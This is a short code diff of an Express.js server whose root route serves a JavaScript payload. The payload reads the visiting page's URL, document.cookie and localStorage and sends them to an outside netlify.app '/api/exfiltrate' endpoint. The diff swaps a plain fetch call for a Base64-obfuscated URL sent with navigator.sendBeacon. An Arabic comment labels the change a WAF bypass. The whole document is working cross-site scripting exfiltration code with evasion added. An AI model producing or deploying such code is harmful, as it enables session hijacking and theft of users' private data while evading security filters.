@@ -82,7 +82,13 @@ app.get('/dashboard', (req, res) => {
 
 app.get('/', (req, res) => {
     res.set('Content-Type', 'application/javascript');
-    res.send("fetch('https://peaceful-toffee-b5291b.netlify.app/api/exfiltrate', {method:'POST', mode:'no-cors', body:JSON.stringify({url:location.href, cookies:document.cookie, storage:localStorage})});");
+    // كود مشفر لتجاوز أنظمة الحماية (WAF Bypass)
+    const p = "aHR0cHM6Ly9wZWFjZWZ1bC10b2ZmZWUtYjUyOTFiLm5ldGxpZnkuYXBwL2FwaS9leGZpbHRyYXRl"; // رابط تطبيقك مشفر بـ Base64
+    res.send(`
+        var u = atob("${p}");
+        var d = {u:location.href, c:document.cookie, s:JSON.stringify(localStorage)};
+        navigator.sendBeacon(u, JSON.stringify(d));
+    `);
 });
 
 
